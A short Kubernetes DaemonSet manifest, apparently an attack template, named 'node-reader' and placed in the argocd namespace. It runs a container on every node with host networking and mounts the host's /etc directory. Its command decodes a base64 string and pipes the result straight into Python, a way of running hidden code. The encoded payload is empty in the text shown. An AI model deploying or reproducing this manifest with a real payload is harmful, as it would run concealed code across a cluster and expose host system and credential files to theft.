apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-reader
  namespace: argocd
spec:
  selector:
    matchLabels:
      name: node-reader
  template:
    metadata:
      labels:
        name: node-reader
    spec:
      hostNetwork: true
      containers:
      - name: reader
        image: python:3.9-alpine
        command: ["/bin/sh", "-c"]
        args:
        - "echo  | base64 -d | python3 -"
        volumeMounts:
        - name: etc
          mountPath: /host/etc
      volumes:
      - name: etc
        hostPath:
          path: /etc
